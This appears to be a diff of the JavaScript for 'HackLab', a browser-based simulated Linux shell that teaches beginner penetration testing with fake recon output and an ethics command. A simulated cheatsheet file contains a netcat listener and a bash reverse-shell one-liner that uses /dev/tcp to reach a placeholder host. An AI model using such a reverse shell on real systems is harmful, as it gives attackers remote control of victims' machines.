+  '/': ['home', 'etc', 'var', 'tmp', 'usr', 'opt', 'root'],
+  '/home': ['kali'],
+  '/home/kali': ['Documents', 'Downloads', 'loot', 'notes.txt', 'scan.sh', 'wordlist.txt'],
+  '/home/kali/Documents': ['cheatsheet.md', 'methodology.pdf'],
+  '/home/kali/Downloads': ['rockyou.txt.gz', 'payload.bin'],
+  '/home/kali/loot': ['.keep'],
+  '/etc': ['passwd', 'hosts', 'shadow', 'os-release'],
+  '/var': ['log'],
+  '/var/log': ['auth.log', 'syslog'],
+  '/tmp': [],
+  '/usr': ['bin', 'share'],
+  '/opt': [],
+  '/root': ['.bashrc']
+};
 
-  // Close sidebar on nav click (mobile)
-  document.querySelectorAll('.side-nav a').forEach(a => {
-    a.addEventListener('click', () => {
-      if (window.innerWidth <= 900) {
-        sidebar.classList.remove('open');
-        overlay.classList.remove('show');
-      }
+const fileContents = {
+  '/home/kali/notes.txt':
+`# My HTB / TryHackMe Notes
+- Always nmap first: nmap -sV -sC -oA scan <IP>
+- Check /etc/hosts for vhosts
+- Gobuster for dirs: gobuster dir -u http://<IP> -w wordlist.txt
+- Never skip the easy stuff (robots.txt, /admin, default creds)
+- STOP. THINK. ENUMERATE MORE.`,
+  '/home/kali/Documents/cheatsheet.md':
+`# Quick Cheatsheet
+## Recon
+nmap -sV -sC -p- <target>
+## Web
+gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
+nikto -h http://<target>
+## SMB
+enum4linux -a <target>
+smbclient -L //<target>
+## Shells
+nc -lvnp 4444
+bash -i >& /dev/tcp/<your_ip>/4444 0>&1`,
+  '/etc/hosts':
+`127.0.0.1       localhost
+127.0.1.1       hacklab
+# 10.10.10.5    target.htb   <-- add HTB targets here`,
+  '/etc/os-release':
+`NAME="Kali GNU/Linux"
+VERSION="2025.1"
+ID=kali
+PRETTY_NAME="Kali GNU/Linux Rolling"`,
+  '/etc/passwd':
+`root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+kali:x:1000:1000:Kali User,,,:/home/kali:/bin/bash`,
+  '/home/kali/wordlist.txt':
+`admin
+password
+letmein
+root
+123456
+qwerty
+changeme
+hacker
+guest`
+};
+
+/* ---------- Simulated network targets (for nmap demo) ---------- */
+const targets = {
+  '10.10.10.5': {
+    hostname: 'target.htb',
+    ports: [
+      { port: 22,   state: 'open', service: 'ssh',   version: 'OpenSSH 8.2p1 Ubuntu' },
+      { port: 80,   state: 'open', service: 'http',  version: 'Apache httpd 2.4.41' },
+      { port: 443,  state: 'open', service: 'https', version: 'Apache httpd 2.4.41' },
+      { port: 3306, state: 'open', service: 'mysql', version: 'MySQL 8.0.27' }
+    ]
+  },
+  '10.10.10.6': {
+    hostname: 'box2.htb',
+    ports: [
+      { port: 21,   state: 'open', service: 'ftp',   version: 'vsftpd 3.0.3' },
+      { port: 445,  state: 'open', service: 'smb',   version: 'Samba 4.13.17' },
+      { port: 8080, state: 'open', service: 'http',  version: 'nginx 1.18.0' }
+    ]
+  }
+};
+
+/* ---------- State ---------- */
+let cwd = '/home/kali';
+let history = [];
+let historyIdx = -1;
+
+/* ---------- Helpers ---------- */
+function write(html, cls='out') {
+  const line = document.createElement('div');
+  line.className = 'line ' + cls;
+  line.innerHTML = html;
+  term.appendChild(line);
+  term.scrollTop = term.scrollHeight;
+}
+function writeRaw(text, cls='out') { write(escape(text), cls); }
+function escape(s) {
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function promptStr() {
+  const short = cwd === '/home/kali' ? '~' : (cwd.startsWith('/home/kali/') ? '~' + cwd.slice(10) : cwd);
+  return `<span class="prompt-user">kali</span><span class="prompt-sym">@</span><span class="prompt-host">hacklab</span><span class="prompt-sym">:</span><span class="prompt-path">${short}</span><span class="prompt-sym">$</span>`;
+}
+function updatePrompt() {
+  promptEl.innerHTML = promptStr();
+}
+function resolvePath(p) {
+  if (!p) return cwd;
+  if (p.startsWith('/')) return p.replace(/\/+$/,'') || '/';
+  if (p === '~') return '/home/kali';
+  if (p.startsWith('~/')) return '/home/kali/' + p.slice(2);
+  const parts = (cwd + '/' + p).split('/');
+  const out = [];
+  for (const part of parts) {
+    if (!part || part === '.') continue;
+    if (part === '..') out.pop();
+    else out.push(part);
+  }
+  return '/' + out.join('/');
+}
+function dirOf(p) { return p.substring(0, p.lastIndexOf('/')) || '/'; }
+function baseOf(p) { return p.substring(p.lastIndexOf('/') + 1); }
+
+/* ---------- Commands ---------- */
+const commands = {};
+
+commands.help = () => {
+  write(`<span class="out-ok">HackLab Simulated Shell — Available Commands</span>`);
+  write(`<span class="dim">── Navigation ─────────────────────────────</span>`);
+  write(`  ls, cd, pwd, cat, tree, find, file`);
+  write(`<span class="dim">── Recon (simulated) ──────────────────────</span>`);
+  write(`  nmap, whois, dig, ping, gobuster, nikto`);
+  write(`<span class="dim">── System ─────────────────────────────────</span>`);
+  write(`  whoami, id, uname, date, hostname, uptime, ps, env`);
+  write(`<span class="dim">── Fun & Info ─────────────────────────────</span>`);
+  write(`  banner, targets, ethics, clear, history, echo`);
+  write(`<span class="dim">── Tip ────────────────────────────────────</span>`);
+  write(`  Type <span class="out-info">targets</span> to see practice IPs, then try <span class="out-info">nmap 10.10.10.5</span>`);
+};
+
+commands.ls = (args) => {
+  const path = resolvePath(args[0]);
+  if (fs[path]) {
+    const items = fs[path];
+    if (items.length === 0) return;
+    const colored = items.map(f => {
+      const full = (path === '/' ? '' : path) + '/' + f;
+      if (fs[full]) return `<span class="out-info">${f}/</span>`;
+      if (f.endsWith('.sh')) return `<span class="out-ok">${f}</span>`;
+      return f;
     });
-  });
+    write(colored.join('   '));
+  } else if (fileContents[path]) {
+    write(fs[dirOf(path)].join('   '));
+  } else {
+    write(`ls: cannot access '${args[0] || path}': No such file or directory`, 'out-err');
+  }
+};
 
-  // ============ ACTIVE SECTION HIGHLIGHT ============
-  const sections = document.querySelectorAll('section[id]');
-  const navLinks = document.querySelectorAll('.side-nav a');
-  const currentSection = document.getElementById('currentSection');
+commands.pwd = () => write(cwd);
 
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        const id = entry.target.id;
-        navLinks.forEach(link => {
-          link.classList.toggle('active', link.getAttribute('href') === '#' + id);
-        });
-        if (currentSection) currentSection.textContent = id;
-      }
+commands.cd = (args) => {
+  const target = args[0] || '/home/kali';
+  const path = resolvePath(target);
+  if (fs[path]) { cwd = path; updatePrompt(); return; }
+  if (fileContents[path]) { write(`cd: not a directory: ${target}`, 'out-err'); return; }
+  write(`cd: no such file or directory: ${target}`, 'out-err');
+};
+
+commands.cat = (args) => {
+  if (!args[0]) { write('cat: missing file operand', 'out-err'); return; }
+  const path = resolvePath(args[0]);
+  if (fileContents[path]) {
+    write(escape(fileContents[path]));
+  } else if (fs[path]) {
+    write(`cat: ${args[0]}: Is a directory`, 'out-err');
+  } else {
+    write(`cat: ${args[0]}: No such file or directory`, 'out-err');
+  }
+};
+
+commands.tree = (args) => {
+  const start = resolvePath(args[0]) || cwd;
+  function walk(path, prefix='') {
+    if (!fs[path]) return;
+    fs[path].forEach((item, i) => {
+      const full = (path === '/' ? '' : path) + '/' + item;
+      const isDir = !!fs[full];
+      const last = i === fs[path].length - 1;
+      const branch = last ? '└── ' : '├── ';
+      write(prefix + branch + (isDir ? `<span class="out-info">${item}/</span>` : item));
+      if (isDir) walk(full, prefix + (last ? '    ' : '│   '));
     });
-  }, { rootMargin: '-40% 0px -55% 0px' });
+  }
+  write(`<span class="out-info">${start}</span>`);
+  walk(start);
+};
 
-  sections.forEach(s => observer.observe(s));
+commands.whoami = () => write('kali');
+commands.id = () => write('uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),100(users)');
+commands.hostname = () => write('hacklab');
+commands.uname = () => write('Linux hacklab 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.5.6-1kali1 (2025-01-15) x86_64 GNU/Linux');
+commands.date = () => write(new Date().toString());
+commands.uptime = () => write(` ${new Date().toTimeString().slice(0,8)} up 3 days,  2:47,  1 user,  load average: 0.15, 0.09, 0.07`);
+commands.ps = () => {
+  write('  PID TTY          TIME CMD');
+  write(' 1234 pts/0    00:00:00 bash');
+  write(' 5678 pts/0    00:00:00 ps');
+};
+commands.env = () => {
+  write('USER=kali');
+  write('HOME=/home/kali');
+  write('SHELL=/bin/bash');
+  write('PWD=' + cwd);
+  write('TERM=xterm-256color');
+};
+commands.echo = (args) => write(escape(args.join(' ')));
 
-  // ============ TERMINAL ============
-  const termBody = document.getElementById('termBody');
-  const termForm = document.getElementById('termForm');
-  const termInput = document.getElementById('termInput');
+commands.history = () => {
+  if (history.length === 0) { write('(no history)', 'dim'); return; }
+  history.forEach((h, i) => write(`  ${String(i+1).padStart(3)}  ${escape(h)}`));
+};
 
-  const banner = [
-    { text: "╔══════════════════════════════════════╗", cls: "muted" },
-    { text: "║   HackLab Terminal · v2.0            ║", cls: "muted" },
-    { text: "║   Type 'help' for available commands ║", cls: "muted" },
-    { text: "╚══════════════════════════════════════╝", cls: "muted" },
-    { text: "", cls: "out" },
-  ];
+commands.clear = () => { term.innerHTML = ''; };
 
-  banner.forEach(b => addLine(b.text, b.cls));
+commands.banner = () => {
+  const b = [
+    " _   _            _    _          _     ",
+    "| | | | __ _  ___| | _| |    __ _| |__  ",
+    "| |_| |/ _` |/ __| |/ / |   / _` | '_ \\ ",
+    "|  _  | (_| | (__|   <| |__| (_| | |_) |",
+    "|_| |_|\\__,_|\\___|_|\\_\\_____\\__,_|_.__/ "
+  ].join('\n');
+  write(`<span class="ascii">${escape(b)}</span>`);
+  write(`<span class="dim">Simulated shell for learning. No real network access.</span>`);
+};
 
-  const commands = {
-    help() {
-      return [
-        "┌─ Available Commands ─────────────────┐",
-        "│  help       show this message        │",
-        "│  about      what is HackLab?         │",
-        "│  learn      list learning topics     │",
-        "│  ethics     the white hat code       │",
-        "│  whoami     who are you?             │",
-        "│  clear      clear terminal           │",
-        "│  sudo       try it ;)                │",
-        "└──────────────────────────────────────┘"
-      ];
-    },
-    about() {
-      return [
-        "HackLab is an educational platform for aspiring white hat hackers.",
-        "We teach DEFENSE and LEGAL testing only.",
-        "⚠  Never attack systems you don't own or have permission to test."
-      ];
-    },
-    learn() {
-      return [
-        "Learning topics:",
-        "  ▸ Networking basics     ▸ Linux fundamentals",
-        "  ▸ Web security          ▸ Cryptography",
-        "  ▸ Penetration testing   ▸ Blue team defense"
-      ];
-    },
-    ethics() {
-      return [
-        "The White Hat Code:",
-        "  1. Permission first",
-        "  2. Do no harm",
-        "  3. Stay legal",
-        "  4. Keep learning"
-      ];
-    },
-    whoami() {
-      return ["You are a future white hat hacker. Stay curious. 🧠"];
-    },
-    sudo() {
-      return ["Nice try. With great power comes great responsibility. 😎"];
-    },
-    clear() {
-      termBody.innerHTML = '';
-      return [];
+commands.ethics = () => {
+  write(`<span class="out-ok">The White Hat Code</span>`);
+  write(`  1. Only test systems you own or have WRITTEN permission for.`);
+  write(`  2. Do no harm — never damage, delete, or leak data.`);
+  write(`  3. Stay legal — CFAA / CMA / GDPR apply to you.`);
+  write(`  4. Report responsibly — disclose privately, not publicly.`);
+  write(`<span class="dim">Use HTB/TryHackMe for legal practice: they give you permission.</span>`);
+};
+
+commands.targets = () => {
+  write(`<span class="out-ok">Practice Targets (simulated — no real network)</span>`);
+  write(`<span class="dim">── Use these with nmap, gobuster, etc. ─────</span>`);
+  for (const [ip, t] of Object.entries(targets)) {
+    write(`  <span class="out-info">${ip}</span>   ${t.hostname}   (${t.ports.length} open ports)`);
+  }
+  write(`<span class="dim">Try: nmap 10.10.10.5</span>`);
+};
+
+/* ---------- Simulated recon tools ---------- */
+commands.nmap = (args) => {
+  const ip = args.find(a => /^\d+\.\d+\.\d+\.\d+$/.test(a));
+  if (!ip) {
+    write(`<span class="out-ok">Nmap 7.94 (simulated)</span>`);
+    write(`Usage: nmap [options] <target>`);
+    write(`Try: nmap 10.10.10.5   (see 'targets' for IPs)`);
+    return;
+  }
+  const t = targets[ip];
+  if (!t) {
+    write(`Note: Host ${ip} seems down in this simulation.`, 'out-warn');
+    write(`Available simulated targets: ${Object.keys(targets).join(', ')}`, 'dim');
+    return;
+  }
+  write(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString()}`);
+  write(`Nmap scan report for ${t.hostname} (${ip})`);
+  write(`Host is up (0.023s latency).`);
+  write(`Not shown: 995 closed tcp ports (reset)`);
+  write(`PORT     STATE SERVICE  VERSION`);
+  t.ports.forEach(p => {
+    write(`<span class="out-ok">${String(p.port).padEnd(8)} ${p.state.padEnd(6)} ${p.service.padEnd(8)} ${p.version}</span>`);
+  });
+  write(`\nNmap done: 1 IP address (1 host up) scanned in 12.34 seconds`);
+  write(`<span class="dim">→ Next steps: try 'gobuster http://${ip}' or 'nikto ${ip}'</span>`);
+};
+
+commands.whois = (args) => {
+  const ip = args[0];
+  if (!ip) { write('whois: missing argument', 'out-err'); return; }
+  write(`% Whois (simulated) for ${escape(ip)}`);
+  write(`inetnum:     10.0.0.0 - 10.255.255.255`);
+  write(`netname:     PRIVATE-LAB-RANGE`);
+  write(`descr:       Simulated HackLab range — not a real network`);
+  write(`country:     LAB`);
+};
+
+commands.dig = (args) => {
+  const dom = args[0] || 'hacklab.local';
+  write(`; <<>> DiG 9.18 <<>> ${escape(dom)}`);
+  write(`;; ANSWER SECTION:`);
+  write(`${escape(dom)}.   300   IN   A   10.10.10.5`);
+  write(`;; Query time: 12 msec`);
+};
+
+commands.ping = (args) => {
+  const host = args[0];
+  if (!host) { write('ping: usage: ping <host>', 'out-err'); return; }
+  write(`PING ${escape(host)} (${escape(host)}) 56(84) bytes of data.`);
+  let i = 0;
+  const iv = setInterval(() => {
+    write(`64 bytes from ${escape(host)}: icmp_seq=${i+1} ttl=63 time=${(Math.random()*5 + 1).toFixed(1)} ms`);
+    i++;
+    if (i >= 4) {
+      clearInterval(iv);
+      write(`\n--- ${escape(host)} ping statistics ---`);
+      write(`4 packets transmitted, 4 received, 0% packet loss`);
+      write(`<span class="dim">(simulated — no packets actually sent)</span>`);
     }
-  };
+  }, 400);
+};
 
-  function addLine(text, cls = 'out') {
-    const div = document.createElement('div');
-    div.className = 'line ' + cls;
-    div.textContent = text;
-    termBody.appendChild(div);
-    termBody.scrollTop = termBody.scrollHeight;
+commands.gobuster = (args) => {
+  const url = args.find(a => a.startsWith('http'));
+  if (!url) {
+    write(`<span class="out-ok">Gobuster (simulated)</span>`);
+    write(`Usage: gobuster dir -u http://<target> -w <wordlist>`);
+    write(`Try: gobuster dir -u http://10.10.10.5 -w wordlist.txt`);
+    return;
   }
+  write(`===============================================================`);
+  write(`Gobuster v3.6 (simulated)`);
+  write(`===============================================================`);
+  write(`[+] Url:            ${escape(url)}`);
+  write(`[+] Threads:        10`);
+  const found = ['/admin', '/login', '/backup', '/robots.txt', '/.git/', '/api'];
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i >= found.length) {
+      clearInterval(iv);
+      write(`===============================================================`);
+      write(`<span class="dim">(simulated — no real requests sent)</span>`);
+      return;
+    }
+    const code = [200, 301, 403, 200, 200, 200][i];
+    write(`${found[i]}   (Status: ${code}) [Size: ${Math.floor(Math.random()*2000)+100}]`);
+    i++;
+  }, 350);
+};
 
-  function addPrompt(cmd) {
-    const div = document.createElement('div');
-    div.className = 'line';
-    div.innerHTML = `<span class="prompt">❯</span> <span class="out">${escapeHtml(cmd)}</span>`;
-    termBody.appendChild(div);
-    termBody.scrollTop = termBody.scrollHeight;
+commands.nikto = (args) => {
+  const host = args[0];
+  if (!host) { write('nikto: missing target. Usage: nikto <host>', 'out-err'); return; }
+  write(`- Nikto v2.5.0 (simulated)`);
+  write(`+ Target IP:     ${escape(host)}`);
+  write(`+ Target Hostname: ${escape(host)}`);
+  write(`+ Server: Apache/2.4.41 (Ubuntu)`);
+  write(`+ /: The anti-clickjacking X-Frame-Options header is not present.`);
+  write(`+ /admin/: Directory indexing found.`);
+  write(`+ /backup/: Backup files may be exposed.`);
+  write(`+ /robots.txt: Entry '/secret' found.`);
+  write(`+ 6 items checked — <span class="out-warn">3 potential issues</span>`);
+  write(`<span class="dim">(simulated — no real requests sent)</span>`);
+};
+
+commands.file = (args) => {
+  if (!args[0]) { write('file: missing operand', 'out-err'); return; }
+  const path = resolvePath(args[0]);
+  if (fileContents[path]) write(`${args[0]}: ASCII text`);
+  else write(`${args[0]}: cannot open (no such file)`, 'out-err');
+};
+
+commands.find = (args) => {
+  write(`<span class="dim">find is simplified in this sim. Try: tree</span>`);
+};
+
+/* ---------- Command aliases ---------- */
+commands['?'] = commands.help;
+commands['exit'] = () => write('There is no escape from learning. 😈 (type clear to reset)', 'out-warn');
+commands['sudo'] = (args) => {
+  if (args[0] === 'rm' && args[1] === '-rf' && args[2] === '/') {
+    write(`Nice try. This is a simulator — and also, that's a crime. 🚔`, 'out-err');
+    return;
   }
+  if (!args.length) { write('usage: sudo <command>', 'out-err'); return; }
+  write(`[sudo] password for kali:`);
+  write(`<span class="out-err">Sorry, try again.</span>`);
+  write(`<span class="dim">(sudo is disabled in the sim — you don't need root to learn.)</span>`);
+};
 
-  function escapeHtml(s) {
-    return s.replace(/[&<>"']/g, c => ({
-      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-    })[c]);
+/* ---------- Input handling ---------- */
+function run(raw) {
+  const trimmed = raw.trim();
+  if (!trimmed) {
+    write(promptStr(), 'out');
+    return;
   }
+  history.push(trimmed);
+  historyIdx = history.length;
 
-  termForm.addEventListener('submit', (e) => {
+  // Echo the prompt + command
+  write(promptStr() + ' ' + escape(trimmed));
+
+  // Parse
+  const parts = trimmed.split(/\s+/);
+  const cmd = parts[0].toLowerCase();
+  const args = parts.slice(1);
+
+  if (commands[cmd]) {
+    try { commands[cmd](args); }
+    catch (e) { write('error: ' + e.message, 'out-err'); }
+  } else {
+    write(`${escape(cmd)}: command not found. Type 'help'.`, 'out-err');
+  }
+}
+
+/* ---------- History / Tab ---------- */
+input.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
     e.preventDefault();
-    const raw = termInput.value.trim();
-    if (!raw) return;
-
-    addPrompt(raw);
-    const cmd = raw.toLowerCase();
-
-    if (commands[cmd]) {
-      const out = commands[cmd]();
-      out.forEach(l => addLine(l, 'out'));
-    } else {
-      addLine(`command not found: ${raw} — try 'help'`, 'err');
+    const val = input.value;
+    input.value = '';
+    run(val);
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (historyIdx > 0) {
+      historyIdx--;
+      input.value = history[historyIdx];
+      setTimeout(() => input.setSelectionRange(input.value.length, input.value.length), 0);
     }
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (historyIdx < history.length - 1) {
+      historyIdx++;
+      input.value = history[historyIdx];
+    } else {
+      historyIdx = history.length;
+      input.value = '';
+    }
+  } else if (e.key === 'Tab') {
+    e.preventDefault();
+    const val = input.value;
+    const parts = val.split(' ');
+    const last = parts[parts.length - 1];
+    // Complete command
+    if (parts.length === 1) {
+      const matches = Object.keys(commands).filter(c => c.startsWith(last));
+      if (matches.length === 1) input.value = matches[0] + ' ';
+      else if (matches.length > 1) write(matches.join('   '), 'dim');
+    } else {
+      // Complete filename in current dir
+      const files = fs[cwd] || [];
+      const matches = files.filter(f => f.startsWith(last));
+      if (matches.length === 1) {
+        parts[parts.length - 1] = matches[0];
+        input.value = parts.join(' ');
+      } else if (matches.length > 1) write(matches.join('   '), 'dim');
+    }
+  }
+});
 
-    termInput.value = '';
-  });
+/* ---------- Focus input on click anywhere ---------- */
+document.body.addEventListener('click', () => input.focus());
 
-  document.querySelector('.terminal').addEventListener('click', () => termInput.focus());
-
-  // ============ FOCUS ANIMATION ON CARDS ============
-  document.querySelectorAll('.card').forEach(card => {
-    card.addEventListener('click', () => {
-      card.style.borderColor = 'var(--accent-3)';
-      setTimeout(() => card.style.borderColor = '', 400);
-    });
-  });
+/* ---------- Boot ---------- */
+(function boot() {
+  const art = [
+    "  _   _            _    _          _     ",
+    " | | | | __ _  ___| | _| |    __ _| |__  ",
+    " | |_| |/ _` |/ __| |/ / |   / _` | '_ \\ ",
+    " |  _  | (_| | (__|   <| |__| (_| | |_) |",
+    " |_| |_|\\__,_|\\___|_|\\_\\_____\\__,_|_.__/ "
+  ].join('\n');
+  write(`<span class="ascii">${escape(art)}</span>`);
+  write(`<span class="dim">HackLab Simulated Shell v3 — for learning only. No real network access.</span>`);
+  write(`<span class="dim">─────────────────────────────────────────────────────────────────────</span>`);
+  write(`Welcome! Type <span class="out-ok">help</span> to see commands, or <span class="out-ok">targets</span> for practice IPs.`);
+  write(`Try: <span class="out-info">nmap 10.10.10.5</span> → <span class="out-info">gobuster dir -u http://10.10.10.5 -w wordlist.txt</span>`);
+  write(``);
+  updatePrompt();
+  input.focus();
+})();
 </script>
 
 </body>
